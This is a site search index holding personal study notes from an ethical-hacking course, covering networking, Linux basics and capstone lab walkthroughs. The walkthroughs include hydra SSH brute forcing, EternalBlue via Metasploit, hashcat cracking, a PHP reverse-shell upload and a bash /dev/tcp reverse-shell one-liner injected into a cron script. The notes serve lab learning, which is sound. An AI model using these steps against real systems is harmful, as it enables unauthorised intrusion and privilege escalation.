{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Obsidian Notes","text":"<p>[[1. NoteKeeping]] [[2. Networking refresher]] [[3. Setting Up Our Lab]] [[4. Introduction to Linux]] [[5. Introduction to Python]] [[6. The Ethical Hacker Methodology]] [[7. Information Gathering (Reconnaissance)]] [[8. Scanning &amp; Enumeration]] [[9. Vulnerability Scanning with Nessus]] [[10. Exploitation Basics]] [[11. New Capstone]] [[12. Introduction to Exploit Development (Buffer Overflows)]] [[a. Active directory overview]] [[b. Active Directory Lab Build]] [[c. Attacking Active Directory: Initial Attack Vectors]] [[d. Attacking Active Directory: Post Compromise Enumeration]] [[e. Attacking Active Directory: Post Compromise Attacks]] [[f. We've Compromised the Domain, Now What?]] [[g. Additional Active Directory Attacks]] [[h. Active Directory Case Studies]] [[i. Post Exploitation]] [[j. Web Application Enumeration, Revisited]] [[k. Find &amp; Exploit Common Web Vulnerabilities]] [[l. Wireless Penetration Testing]] [[m. Legal Documents and Report Writing]] [[n.001 Career Advice]]</p>"},{"location":"1.NoteKeeping/1.How%20to%20use%20obsidian%20.../","title":"paragraph : separated by a line","text":"<p><code>&amp;nbsp;</code> : blank space <code>&lt;br&gt;</code> : new line</p>"},{"location":"1.NoteKeeping/1.How%20to%20use%20obsidian%20.../#heading","title":"heading","text":"<p>2.GreenShot or FlameShot for internal links or [wikipedia][https://fr.wikipedia.org/wiki/Windows_Millennium_Edition] for internal and external</p> <p>&lt;&gt; or 20% if there is aspace in url</p> <p>[!note] aaka aaaa </p> <p>kskjsdkjsd sdsdjksd -me</p> <p>si <code>sdjsj</code> djkdjkd</p> <p><pre><code>dkjsksjdsk\nsddjsk if \nfor \n\nendif\n</code></pre>     jddksdkdsksk      sdksks <pre><code>hjassajhs\nasjkas\nasjas if for \n</code></pre></p> <pre><code>if for print(sajksa)\n</code></pre> <p></p> <p>This is a simple footnote<sup>1</sup>.</p> <p>You can also use inline footnotes. ^[This is an inline footnote.]</p> <pre><code>sequenceDiagram Alice-&gt;&gt;+John: Hello John, how are you? Alice-&gt;&gt;+John: John, can you hear me? John--&gt;&gt;-Alice: Hi Alice, I can hear you! John--&gt;&gt;-Alice: I feel great! </code></pre> <p>[!anything]</p> <p>To create a heading, add up to six\u00a0\u00a0symbols before your heading text. The number of\u00a0<code>#</code>\u00a0symbols determines the size of the heading.</p> <p>To create a heading, add up to six\u00a0<code>#</code>\u00a0symbols before your heading text. The number of\u00a0<code>#</code>\u00a0symbols determines the size of the heading.</p> <ol> <li> <p>This is the referenced text.\u00a0\u21a9</p> </li> <li> <p>Add 2 spaces at the start of each new line.   This lets you write footnotes that span multiple lines.\u00a0\u21a9</p> </li> <li> <p>Named footnotes still appears as numbers, but can make it easier to identify and link references.\u00a0\u21a9</p> </li> </ol>"},{"location":"1.NoteKeeping/2.GreenShot%20or%20FlameShot/","title":"2.GreenShot or FlameShot","text":"<ul> <li>I choose greenshot that can do:</li> <li>border</li> <li>inverse (black to white for eco-friendly)</li> <li>highiight with rectangle</li> <li>blure a secret</li> </ul>"},{"location":"10.Exploitation%20Basics/1.Reverse%20Shells%20vs%20Bind%20Shells/","title":"1.Reverse Shells vs Bind Shells","text":"<p>pop a shell : get access to machine reverse shell : target(victim) connect to us : 95% </p> <p>bind shell : we connect to a target(victim) </p>"},{"location":"10.Exploitation%20Basics/2.Staged%20vs%20Non-Staged%20Payloads/","title":"2.Staged vs Non Staged Payloads","text":"<p>payload : run exploit </p>"},{"location":"10.Exploitation%20Basics/3.%20%20Gaining%20Root%20with%20Metasploit/","title":"3.  Gaining Root with Metasploit","text":"<p>used unstaged payload to get a shell </p> <p><code>msconsole</code> <code>use payload</code> <code>options</code></p> <p>metasploit is automatic</p>"},{"location":"10.Exploitation%20Basics/4.Manual%20Exploitation/","title":"4.Manual Exploitation","text":"<p>we download openLuck using github instructions :  root this machine with manually downloaded exploit instead of metasploit.</p> <p>[!note] we rooted this machine twice</p>"},{"location":"10.Exploitation%20Basics/5.Brute%20Force%20Attacks/","title":"5.Brute Force Attacks","text":"<p>being loud sometimes : so during the pentest u say kudos to blue team in this scan but u did not see us in this part .</p> <p><code>hydra -l root -P /usr/share/wordlists/pswd.txt ssh://ipofachine andport -t 4 - V</code></p> <p>another way with metasploit : <code>msfconsole</code> <code>search ssh</code> <code>use auxialry/..</code> <code>options</code> <code>set username root</code> <code>set pass_file  /usr/share/wordlists/pswd.txt</code> <code>set rhosts ip</code> <code>set threads 10</code> <code>set verbose true</code> <code>run</code></p>"},{"location":"10.Exploitation%20Basics/7.Our%20Notes%2C%20Revisited/","title":"7.Our Notes, Revisited","text":""},{"location":"11.New%20Capstone/1.Blue/","title":"1.Blue","text":"<p>Windows 7 Ultimate 7601 Service Pack 1  then smfconsole: searche eternalblue  use scanner options  set rhosts</p> <p>search eternalblue use explot/windows/eternalblue options set rhost check set payload /windows/x64/meterpreter/reverse-tcp set lhost eth0 run</p> <p>hashdump : to see admin hash ..</p> <p>RCE can take down a machine</p>"},{"location":"11.New%20Capstone/1.Blue/#manually","title":"manually:","text":"<p>https://github.com/3ndG4me/AutoBlue-MS17-010</p>"},{"location":"11.New%20Capstone/2.academy/","title":"ftp","text":"<p>ftp [ip] anonymous , anonymous get</p> <p>cat note.txt</p>"},{"location":"11.New%20Capstone/2.academy/#crack-hash-found","title":"crack hash found","text":"<p>hashidentifier locate rockyou.txt sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz hashes.txt hashcat -m 0 hashes.txt rockyou.txt 'student'</p>"},{"location":"11.New%20Capstone/2.academy/#fuzzing","title":"fuzzing","text":"<p>dirb http://10.0.2.5 ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.0.2.5/FUZZ 'academy'</p> <p>then: 10201321 and student</p>"},{"location":"11.New%20Capstone/2.academy/#shell","title":"shell","text":"<p>!we need code execution!</p> <p>upload malicious file in profile ! ummm : 'php reverse shell' --&gt; shell.php and upload it</p> <p>shell is got whoami --&gt; normal user</p>"},{"location":"11.New%20Capstone/2.academy/#privilege_escalation","title":"privilege_escalation","text":"<p>linpeas run python server : python3 -m http.server 8080 then go to shell you spawn earlier : wget 10.0.2.4:8080/linpeas.sh <pre><code>/home/grimmie/backup.sh\n\n/var/www/html/academy/includes/config.php:$mysql_password = \"My_V3ryS3cur3_P4ss\";\n</code></pre></p> <p> find a password</p>"},{"location":"11.New%20Capstone/2.academy/#ssh","title":"ssh","text":"<p>ssh grimmie@10.0.2.5</p> <p>shell crontab -l  crontab -e crontab -u root -l</p> <p>systemctl list-timers</p>"},{"location":"11.New%20Capstone/2.academy/#validatio-that-is-runing-in-timmer","title":"validatio that is runing in timmer :","text":"<p>pspy64 install and add it to transfer to run in with gimmie shell</p>"},{"location":"11.New%20Capstone/2.academy/#reverse_shell","title":"reverse_shell","text":"<p>reverse shell one liner https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</p> <p>inject this in backup.sh after deleting its content: bash -i &gt;&amp; /dev/tcp/10.0.2.4/8081 0&gt;&amp;1</p>"},{"location":"11.New%20Capstone/3.dev/","title":"3.dev","text":"<p>80 8080 2049  are intersting </p> <p>ummm : lets fuff</p> <p> for 8080 also</p> <p>umm  lets try to crack : </p> <p></p> <p></p> <p>lets try : </p> <p>umm </p> <p>use wirebolt exploit ; local file inclusion /../../etc/paswd in url </p> <p></p> <p>then i know user .. also from config.yaml : i_love_java</p> <p></p>"},{"location":"11.New%20Capstone/3.dev/#gtfobin-website","title":"gtfobin website","text":""},{"location":"11.New%20Capstone/3.dev/#mount_enumerateweb_classicsudowithnopasswordescalationusingzip","title":"mount_enumerateWeb_classicSudoWithNoPasswordEscalationUsingZIP","text":""},{"location":"11.New%20Capstone/4.Butler/","title":"search google : jenkins exploit","text":""},{"location":"11.New%20Capstone/4.Butler/#try-default-password","title":"try default password","text":""},{"location":"11.New%20Capstone/4.Butler/#try-fuzzing-directory","title":"try fuzzing directory","text":""},{"location":"11.New%20Capstone/4.Butler/#try-connect-to-the-other-port-by-telent-or-netcat-7680","title":"try connect to the other port by telent or netcat :7680","text":""},{"location":"11.New%20Capstone/4.Butler/#try-bruteforce-burp-or-metasploit","title":"try bruteforce : burp or metasploit","text":"<p>use cluster bomb :... found password : jenkins:jenkins </p> <p></p> <p></p> <p></p> <p>now  </p>"},{"location":"11.New%20Capstone/4.Butler/#escalation","title":"escalation!","text":""},{"location":"11.New%20Capstone/4.Butler/#winpeas","title":"winpeas","text":"<p>host it </p> <p>we need to put the file someplace that is writeable </p> <p></p> <p>now run : winpeas.exe we are looking for system priveleges that is callled : unquoted service path </p> <p>when start looking it start with : c:/program.exe then  c:/program iles.exe and so on ......</p> <p>so we can upload a malware that can be executed if we have the rigt permissions</p> <p>.... lets generate: </p> <p></p> <p></p> <p></p> <p></p> <p>if we run the wise.exe ... we won't get nothing since i am a regular user</p> <p></p> <p></p> <p>lets start it</p> <p></p> <p>done </p> <p>privelge escalation checklist ! umm</p>"},{"location":"12.Introduction%20to%20Exploit%20Development%20%28Buffer%20Overflows%29/1.%20%20Required%20Installations/","title":"1.  Required Installations","text":"<p>Resources for this video: - in case u not have windows : install it : windows evaluation in google</p> <p>Immunity Debugger:\u00a0https://www.immunityinc.com/products/debugger/</p> <p>Vulnserver:\u00a0http://www.thegreycorner.com/p/vulnserver.html</p>"},{"location":"12.Introduction%20to%20Exploit%20Development%20%28Buffer%20Overflows%29/2.Buffer%20Overflows%20Explained/","title":"2.Buffer Overflows Explained","text":""},{"location":"2.Networking%20refresher/1.IP%20addresses/","title":"1.IP addresses","text":"<pre><code>ifconfig\n</code></pre> <p>IPv4 (Internet Protocol version 4) and IPv6 (Internet Protocol version 6) are two versions of the Internet Protocol, which is the underlying protocol that enables communication on the internet. They are used to identify and locate devices on a network.</p> <p>IPv4 addresses are 32-bit numerical addresses represented in a dotted-decimal format, such as \"192.168.0.1\". Each section, or octet, of the address consists of 8 bits and can range from 0 to 255. This allows for a total of approximately 4.3 billion unique addresses. However, due to the rapid growth of the internet, the number of available IPv4 addresses has become limited, leading to the development of IPv6.</p> <p>IPv6 addresses are 128-bit addresses represented in a hexadecimal format, such as \"2001:0db8:85a3:0000:0000:8a2e:0370:7334\". The longer address length of IPv6 allows for a significantly larger number of unique addresses, approximately 3.4\u00d710^38. IPv6 addresses are divided into eight groups of four hexadecimal digits, separated by colons. Leading zeros within a group can be omitted, and consecutive groups of zeros can be represented by a double colon (::) to simplify the address.</p> <p>The transition from IPv4 to IPv6 is necessary due to the depletion of available IPv4 addresses. IPv6 provides a solution to the address shortage while also introducing improvements in security, auto-configuration, and other features. However, IPv4 and IPv6 are not directly compatible, so various mechanisms and transition technologies exist to enable communication between the two protocols.</p> <p>In summary, IPv4 and IPv6 are versions of the Internet Protocol that provide unique addresses to devices on a network. IPv4 addresses are 32-bit, while IPv6 addresses are 128-bit. IPv6 offers a larger address space and additional features compared to IPv4.</p> <p>[!Note] -We still use ipv4 thanks to NAT </p> <p>-C class is most used at homes and small businesses</p> <p>[!info] IP is a layer 3 protocol</p>"},{"location":"2.Networking%20refresher/2.MAC%20addresses/","title":"2.MAC addresses","text":"<p>A MAC (Media Access Control) address is a unique identifier assigned to network interface controllers (NICs) of network devices. It is a hardware address that is permanently assigned by the manufacturer and is stored in the device's firmware or read-only memory (ROM). MAC addresses are used at the data link layer of the OSI model to ensure that data is delivered to the correct device within a local network.</p> <p>MAC addresses are typically 48 bits in length and are expressed as a sequence of six pairs of hexadecimal digits separated by colons or hyphens. For example, a MAC address may look like \"00:1A:2B:3C:4D:5E\". The first three pairs of digits identify the manufacturer of the network interface card, while the last three pairs provide a unique identifier for the specific device.</p> <p>MAC addresses play a crucial role in Ethernet networks, as they allow devices to communicate with each other within a local area network (LAN). When data is sent from one device to another on the same network, it is encapsulated within Ethernet frames that contain the source and destination MAC addresses. Routers and switches use these MAC addresses to forward the data to the appropriate destination.</p> <p>It's important to note that MAC addresses are specific to the local network and do not have global uniqueness like IP addresses. They are only relevant within the scope of the local network segment. When data needs to be transmitted beyond the local network, it is encapsulated in network packets that contain source and destination IP addresses.</p> <p>In summary, a MAC address is a unique identifier assigned to the network interface controller of a device. It is used at the data link layer to facilitate communication within a local network. MAC addresses are hardware-based, manufacturer-specific, and differ from IP addresses, which are used for network communication on a larger scale.</p> <p>[!Note] mac address lookup website</p> <p>[!info] MAC is a layer 2 protocol</p>"},{"location":"2.Networking%20refresher/3.TCP%2C%20UDP%2C%20and%20the%20Three-Way%20Handshake/","title":"3.TCP, UDP, and the Three Way Handshake","text":"<p>TCP (Transmission Control Protocol) and UDP (User Datagram Protocol) are two commonly used transport layer protocols in computer networks.</p> <p>TCP is a connection-oriented protocol that provides reliable, ordered, and error-checked delivery of data packets over an IP network. It guarantees that data sent from one device is received correctly by the destination device. TCP achieves this reliability through mechanisms like acknowledgement, retransmission, and flow control. It breaks data into smaller packets, assigns sequence numbers to them, and ensures they are reassembled correctly at the receiving end. TCP is widely used for applications that require guaranteed delivery, such as web browsing, email, file transfer, and remote login.</p> <p>UDP, on the other hand, is a connectionless protocol that does not provide the same level of reliability as TCP. It is simpler and more lightweight, making it suitable for applications that can tolerate some data loss or delay. UDP does not establish a connection or guarantee delivery of packets. It simply sends data packets from one device to another without waiting for acknowledgements or retransmissions. UDP is commonly used for real-time applications like streaming media, online gaming, DNS (Domain Name System), and VoIP (Voice over IP).</p> <p>The three-way handshake is a process used by TCP to establish a connection between two devices. It is a sequence of three steps that takes place before data transmission can begin. Here's how the three-way handshake works:</p> <ol> <li>SYN (Synchronize): The initiating device (often referred to as the client) sends a TCP packet with the SYN flag set to the destination device (often referred to as the server). This packet indicates the desire to establish a connection and includes an initial sequence number.</li> <li>SYN-ACK (Synchronize-Acknowledge): Upon receiving the SYN packet, the destination device responds with a TCP packet that has both the SYN and ACK (acknowledge) flags set. This packet acknowledges the receipt of the initial SYN packet and also includes its own initial sequence number.</li> <li>ACK (Acknowledge): Finally, the initiating device acknowledges the SYN-ACK packet by sending an ACK packet back to the destination. This packet confirms the establishment of the connection and typically contains an incremented sequence number.</li> </ol> <p>Once the three-way handshake is complete, the connection is established, and both devices are ready to exchange data. The sequence numbers exchanged during the handshake are used to ensure that data is transmitted and received in the correct order.</p> <p>In summary, TCP is a reliable, connection-oriented protocol that guarantees delivery of data, while UDP is a simpler, connectionless protocol that does not provide the same level of reliability. The three-way handshake is a process used by TCP to establish a connection between devices, involving the exchange of SYN, SYN-ACK, and ACK packets.</p> <p>[!Note] TCP and UDP are a layer 4 protocol</p> <p>[!Example] If u want to connect to port 443 in website , then u send SYN(Hi i want to connect to port 443) ,if available SYN-ACK (connect to me) packet is returned then u send ACK(establish the connection) packet to show that u're ready to go .</p> <ul> <li>modify 3 way handshake for scanning</li> </ul>"},{"location":"2.Networking%20refresher/4.Common%20Ports%20and%20Protocols/","title":"4.Common Ports and Protocols","text":"<p>Here are some commonly used ports and the protocols associated with them in computer networking:</p> <ul> <li>FTP (File Transfer Protocol): Port 21 (TCP)</li> <li>SSH (Secure Shell): Port 22 (TCP)</li> <li>Telnet: Port 23 (TCP)</li> <li>SMTP (Simple Mail Transfer Protocol): Port 25 (TCP)</li> <li>DNS (Domain Name System): Port 53 (TCP and UDP)</li> <li>HTTP (Hypertext Transfer Protocol): Port 80 (TCP)</li> <li>HTTPS (Hypertext Transfer Protocol Secure): Port 443 (TCP)</li> <li>DHCP (Dynamic Host Configuration Protocol): Port 67 (UDP) and Port 68 (UDP)</li> <li>POP3 (Post Office Protocol version 3): Port 110 (TCP)</li> <li>IMAP (Internet Message Access Protocol): Port 143 (TCP)</li> <li>SNMP (Simple Network Management Protocol): Port 161 (UDP)</li> <li>RDP (Remote Desktop Protocol): Port 3389 (TCP)</li> <li>NTP (Network Time Protocol): Port 123 (UDP)</li> <li>SMB (Server Message Block): Port (139+445) (TCP)</li> <li>FTPS (FTP over SSL/TLS): Port 990 (TCP)</li> <li>TFTP (Trivial File Transfer Protocol): Port 69 (UDP)</li> <li>LDAP (Lightweight Directory Access Protocol): Port 389 (TCP and UDP)</li> <li>MySQL: Port 3306 (TCP)</li> <li>RDP (Remote Desktop Protocol): Port 3389 (TCP)</li> </ul> <p>Please note that some protocols use both TCP and UDP, depending on the specific functionality and requirements. Additionally, these port assignments are not exhaustive, and other applications and services may use different ports as well.</p> <p>[!Note] SMB is file share protocol .. and last exploit is wannacry virus (eternal-blue,ms17010) which utilize SMB exploit to navigate through network . it was vicious quickly since smb port  often is open in networks</p>"},{"location":"2.Networking%20refresher/5.OSI%20model/","title":"5.OSI model","text":"<p>The OSI (Open Systems Interconnection) model is a conceptual framework that standardizes the functions of a communication system into seven distinct layers. Each layer has specific responsibilities and interacts with the layers above and below it. The OSI model provides a structured approach to understanding and designing network protocols and communication systems. Here's a brief overview of each layer:</p> <ol> <li>Physical Layer: The physical layer is responsible for the transmission and reception of raw unstructured data bits over a physical medium. It defines the electrical, mechanical, and functional characteristics of the physical interface between devices.</li> <li>Data Link Layer: The data link layer handles the reliable transmission of data frames between directly connected nodes over a physical link. It provides error detection and correction, flow control, and handles access to the physical medium. Ethernet, Wi-Fi, and PPP (Point-to-Point Protocol) are examples of data link layer protocols.</li> <li>Network Layer: The network layer enables the routing of data packets across different networks. It deals with logical addressing and determines the best path for data delivery based on network conditions and routing protocols. The IP (Internet Protocol) is a key network layer protocol.</li> <li>Transport Layer: The transport layer ensures the reliable and orderly delivery of data between end systems. It breaks data into smaller segments, manages end-to-end communication, and provides error recovery, flow control, and congestion control. TCP (Transmission Control Protocol) and UDP (User Datagram Protocol) operate at this layer.</li> <li>Session Layer: The session layer establishes, manages, and terminates communication sessions between applications. It provides synchronization and dialog control mechanisms to enable seamless communication between devices. This layer also handles session checkpointing and recovery.</li> <li>Presentation Layer: The presentation layer is responsible for data representation, encryption, compression, and formatting. It ensures that data sent by the application layer of one system is understandable by the application layer of another system. This layer deals with data syntax and semantics.</li> <li>Application Layer: The application layer is the closest layer to the end-user and provides services directly to user applications. It includes protocols for various application-level services such as file transfer, email, web browsing, and remote access. Examples of protocols at this layer include HTTP, SMTP, FTP, and DNS.</li> </ol> <p>The key idea behind the OSI model is to separate the complex task of network communication into manageable layers, with each layer focused on specific functions. This modular approach facilitates interoperability, ease of implementation, and troubleshooting in network systems.</p> <p>It's important to note that the OSI model is a conceptual model and does not necessarily reflect the exact implementation of all networking systems, which often use a hybrid of various layers and protocols. However, the OSI model remains a useful reference for understanding network communication and protocols.</p> <p> </p> <ul> <li>receive data physical layer down to application</li> <li>transmit is the opposite</li> <li>when troubleshooting start from physical to -- application</li> </ul> <p></p>"},{"location":"2.Networking%20refresher/6.Subnetting%20Part%201/","title":"6.Subnetting Part 1","text":"<p>Resources for this video:</p> <p>Seven Second Subnetting:\u00a0https://www.youtube.com/watch?v=ZxAwQB8TZsM</p> <p>Subnet Guide:\u00a0https://drive.google.com/file/d/1ETKH31-E7G-7ntEOlWGZcDZWuukmeHFe/view</p> <p>Subnetting is the process of dividing a network into smaller subnetworks called subnets. It allows for more efficient use of IP addresses and facilitates network management and routing. Subnetting is commonly used in IPv4 networks.</p> <p>Subnetting involves borrowing bits from the host portion of an IP address to create a subnet identifier. By doing this, a network can be divided into multiple subnets, each with its own range of IP addresses.</p> <p>CIDR (Classless Inter-Domain Routing) notation is a method used to represent IP addresses and their corresponding subnet masks. It specifies the network prefix length, which indicates the number of bits used for the network portion of the IP address. CIDR notation is expressed by appending a forward slash (/) followed by the prefix length to the IP address.</p> <p>Here's an example to illustrate subnetting and CIDR notation:</p> <p>Consider an IP address: 192.168.0.0/24</p> <p>In this example, the IP address is in the format of \"192.168.0.0\" and the \"/24\" represents the prefix length, indicating that the first 24 bits represent the network portion of the IP address, while the remaining 8 bits represent the host portion.</p> <p>With a /24 prefix length, the subnet mask for this network would be 255.255.255.0. This means that the first three octets are reserved for the network, and the last octet can be used for addressing hosts within the subnet.</p> <p>To subnet this network further, additional bits can be borrowed from the host portion. For instance, if we borrow 2 bits, we can create 4 subnets. The subnet mask would become 255.255.255.192 (in binary: 11111111.11111111.11111111.11000000).</p> <p>The four resulting subnets would be:</p> <ol> <li>Subnet 1: 192.168.0.0/26 (network range: 192.168.0.0 - 192.168.0.63)</li> <li>Subnet 2: 192.168.0.64/26 (network range: 192.168.0.64 - 192.168.0.127)</li> <li>Subnet 3: 192.168.0.128/26 (network range: 192.168.0.128 - 192.168.0.191)</li> <li>Subnet 4: 192.168.0.192/26 (network range: 192.168.0.192 - 192.168.0.255)</li> </ol> <p>Each subnet can then be assigned to a different segment or used for different purposes within the network.</p> <p>CIDR notation provides a concise way to represent networks and subnets by specifying the prefix length. It allows for flexibility in defining network boundaries and enables efficient address allocation in IP networking.</p> <ul> <li>how many hosts and subnetmask behind it</li> <li>whack 24 (/24) </li> <li>network ip and breoadcast ip</li> </ul> <p></p> <p>[!Note] website to calculate :  ipv4 to icdr</p>"},{"location":"2.Networking%20refresher/7.Subnetting%20Part%202/","title":"7.Subnetting Part 2","text":""},{"location":"3.Setting%20Up%20Our%20Lab/1.Installing%20VMWare%20or%20VirtualBox/","title":"1.Installing VMWare or VirtualBox","text":"<p>VirtualBox:\u00a0https://www.virtualbox.org/wiki/Downloads</p>"},{"location":"3.Setting%20Up%20Our%20Lab/2.Installing%20Kali%20Linux/","title":"2.Installing Kali Linux","text":"<p>Resources for this video:</p> <p>Download Kali -\u00a0https://www.kali.org/get-kali/#kali-virtual-machines</p> <p>Download 7zip -\u00a0https://www.7-zip.org/download.html</p> <p>Frequently Asked Questions:</p> <p>Question: I installed a version of Kali &gt; 2019.4. The credentials of root:toor no longer work. What are the correct credentials?</p> <p>Resolution:\u00a0The correct credentials, as of 2020.1, are kali:kali</p>"},{"location":"4.Introduction%20to%20Linux/1.Exploring%20Kali%20Linux/","title":"1.Exploring Kali Linux","text":"<p>Kali Linux is a specialized Linux distribution designed for digital forensics, penetration testing, and ethical hacking purposes. It is a powerful and widely used operating system used by cybersecurity professionals, researchers, and enthusiasts.</p> <p>Kali Linux is based on Debian Linux. It provides a comprehensive set of pre-installed tools and software packages specifically tailored for various security testing and hacking purposes.</p> <p>The main goal of Kali Linux is to provide a robust and all-in-one platform for performing security assessments, vulnerability analysis, network scanning, password cracking, wireless security testing, and much more. It includes tools for web application testing, reverse engineering, exploit development, and secure communication as well.</p> <p>Kali Linux is designed with security in mind and comes with features like full disk encryption, secure shell access, and regular updates to ensure a secure and up-to-date environment for its users.</p> <p>While Kali Linux is a powerful tool for security professionals, it is important to use it responsibly and within legal boundaries. Ethical hacking and security testing should always be performed with proper authorization and adherence to applicable laws and regulations.</p>"},{"location":"4.Introduction%20to%20Linux/2.%20%20Sudo%20Overview/","title":"2.  Sudo Overview","text":"<p>The\u00a0<code>sudo</code>\u00a0command in Linux allows a user with appropriate privileges to execute commands as a superuser or another user. It is commonly used to perform administrative tasks that require elevated privileges. Here's an example of how\u00a0<code>sudo</code>\u00a0is used:</p> <p>Let's say you want to install a software package using the\u00a0<code>apt</code>\u00a0package manager, but it requires administrative privileges. You can use\u00a0<code>sudo</code>\u00a0to execute the\u00a0<code>apt</code>\u00a0command with elevated privileges. Here's the command:</p> <p>sudo apt install  <p>For instance, if you want to install the package named \"nginx\" on an Ubuntu system, you can use the following command:</p> <p>sudo apt install nginx </p> <p>After running this command, you will be prompted to enter your password. Once you provide the correct password, the command will be executed with superuser privileges, allowing you to install the \"nginx\" package on the system.</p> <p>Please note that the availability and configuration of\u00a0<code>sudo</code>\u00a0can vary depending on the Linux distribution and the user's privileges. Additionally, the\u00a0<code>sudo</code>\u00a0command can be used for various other administrative tasks, such as editing system files, managing services, and executing critical commands.</p> <p>[!info] - sudo cat /etc/shadow  since it is sensitive - sudo su -</p>"},{"location":"4.Introduction%20to%20Linux/3.%20%20Navigating%20the%20File%20System/","title":"3.  Navigating the File System","text":"<p>Here are explanations and examples of the commands mentioned in this video:</p> <p><code>pwd</code>\u00a0(Print Working Directory):</p> <ul> <li> <ul> <li>Explanation: Displays the current working directory.</li> <li>Example: Running\u00a0<code>pwd</code>\u00a0in the terminal would show the absolute path of the current directory, such as \"/home/user/documents\".</li> </ul> </li> </ul> <p><code>cd</code>\u00a0(Change Directory):</p> <ul> <li> <ul> <li>Explanation: Allows you to change the current working directory.</li> <li>Example: Running\u00a0<code>cd /home/user/documents</code>\u00a0would change the directory to \"/home/user/documents\".</li> </ul> </li> </ul> <p><code>cd ..</code>\u00a0(Change to Parent Directory):</p> <ul> <li> <ul> <li>Explanation: Moves up one level in the directory hierarchy.</li> <li>Example: Running\u00a0<code>cd ..</code>\u00a0in \"/home/user/documents\" would move to the \"/home/user\" directory.</li> </ul> </li> </ul> <p><code>ls</code>\u00a0(List Directory Contents):</p> <ul> <li> <ul> <li>Explanation: Lists the files and directories in the current directory.</li> <li>Example: Running\u00a0<code>ls</code>\u00a0would display the files and directories in the current directory.</li> </ul> </li> </ul> <p><code>ls -la</code>\u00a0(List Detailed Directory Contents):</p> <ul> <li> <ul> <li>Explanation: Lists detailed information about files and directories, including hidden files.</li> <li>Example: Running\u00a0<code>ls -la</code>\u00a0would display a detailed list of files and directories, including hidden files, in the current directory.</li> </ul> </li> </ul> <p><code>mkdir</code>\u00a0(Make Directory):</p> <ul> <li> <ul> <li>Explanation: Creates a new directory.</li> <li>Example: Running\u00a0<code>mkdir new_folder</code>\u00a0would create a new directory named \"new_folder\" in the current directory.</li> </ul> </li> </ul> <p><code>rmdir</code>\u00a0(Remove Directory):</p> <ul> <li> <ul> <li>Explanation: Removes an empty directory.</li> <li>Example: Running\u00a0<code>rmdir empty_folder</code>\u00a0would remove the directory named \"empty_folder\" if it is empty.</li> </ul> </li> </ul> <p><code>man</code>\u00a0(Manual):</p> <ul> <li> <ul> <li>Explanation: Displays the manual pages for a specified command.</li> <li>Example: Running\u00a0<code>man ls</code>\u00a0would show the manual pages with detailed information about the\u00a0<code>ls</code>\u00a0command.</li> </ul> </li> </ul> <p><code>echo</code>:</p> <ul> <li> <ul> <li>Explanation: Displays text or variables as output.</li> <li>Example: Running\u00a0<code>echo \"Hello, world!\"</code>\u00a0would output \"Hello, world!\" in the terminal.</li> </ul> </li> </ul> <p><code>&gt;</code>\u00a0(Output Redirection):</p> <ul> <li> <ul> <li>Explanation: Redirects the output of a command to a file and overwrites the file if it already exists.</li> <li>Example: Running\u00a0<code>echo \"Hello\" &gt; greeting.txt</code>\u00a0would write the text \"Hello\" to a file named \"greeting.txt\" or overwrite the file if it exists.</li> </ul> </li> </ul> <p><code>&gt;&gt;</code>\u00a0(Append Output):</p> <ul> <li> <ul> <li>Explanation: Redirects the output of a command and appends it to a file.</li> <li>Example: Running\u00a0<code>echo \"World!\" &gt;&gt; greeting.txt</code>\u00a0would append the text \"World!\" to the end of the \"greeting.txt\" file.</li> </ul> </li> </ul> <p><code>rm</code>\u00a0(Remove):</p> <ul> <li> <ul> <li>Explanation: Deletes files or directories.</li> <li>Example: Running\u00a0<code>rm file.txt</code>\u00a0would delete the file named \"file.txt\" from the current directory.</li> </ul> </li> </ul> <p><code>mv</code>\u00a0(Move):</p> <ul> <li> <ul> <li>Explanation: Moves or renames files and directories.</li> <li>Example: Running\u00a0<code>mv file.txt new_directory/file_renamed.txt</code>\u00a0would move the file \"file.txt\" to the \"new_directory\" and rename it as \"file_renamed.txt\".</li> </ul> </li> </ul> <p><code>cp</code>\u00a0(Copy):</p> <ul> <li> <ul> <li>Explanation: Copies files and directories.</li> <li>Example: Running\u00a0<code>cp file.txt backup/file_copy.txt</code>\u00a0would create a copy of \"file.txt\" named \"file_copy.txt\" in the \"backup\" directory.</li> </ul> </li> </ul> <p><code>locate</code>:</p> <ul> <li> <ul> <li>Explanation: Searches for files and directories in a prebuilt database.</li> <li>Example: Running\u00a0<code>locate myfile.txt</code>\u00a0would search for the file named \"myfile.txt\" in the prebuilt database and display its path if found.</li> </ul> </li> </ul> <p><code>updatedb</code>:</p> <ul> <li> <ul> <li>Explanation: Updates the database used by the\u00a0<code>locate</code>\u00a0command to reflect recent changes in the file system.</li> <li>Example: Running\u00a0<code>updatedb</code>\u00a0would update the database, allowing the\u00a0<code>locate</code>\u00a0command to provide up-to-date search results.</li> </ul> </li> </ul> <p><code>passwd</code>:</p> <ul> <li> <ul> <li>Explanation: Allows a user to change their password.</li> <li>Example: Running\u00a0<code>passwd</code>\u00a0would prompt the user to enter their current password and then set a new password.</li> </ul> </li> </ul> <p>Remember to exercise caution when using commands like\u00a0<code>rm</code>\u00a0as they can permanently delete files. It's always a good practice to double-check before executing such commands.</p> <p>[!info] - kali(user)@kali(hostname=computername) [~] directory i am in - colors brought by ls (file and directory) - tab - u can cd from any folder with the full path or go only to paths u see with ls directly - see files of any folder without being in it  <pre><code>ls /etc\n</code></pre> https://explainshell.com/ <pre><code>man\n\nls --help\n\nls -la \necho 'hi' &gt; test.txt\n\ncp test.txt Downloads/\nrm Downloads/test.txt\nmv test.txt Downloads\nlocate test.txt\nsudo updatedb \npasswd\n</code></pre></p>"},{"location":"4.Introduction%20to%20Linux/4.%20%20Users%20and%20Privileges/","title":"4.  Users and Privileges","text":"<p>In the\u00a0<code>ls -la</code>\u00a0output, the \"rwx\" refers to the permissions associated with a file or directory. The permissions are displayed for three different entities: the owner, the group, and other users. Each entity has three permission categories: read (r), write (w), and execute (x). Here's a breakdown of what each permission category represents:</p> <ul> <li>Read (r): Allows the entity to read or view the contents of a file or the names of files within a directory.</li> <li>Write (w): Enables the entity to modify or write to a file or add, delete, or rename files within a directory.</li> <li>Execute (x): Grants the entity the permission to execute a file or enter a directory. For directories, execute permission is required to access its contents.</li> </ul> <p>In 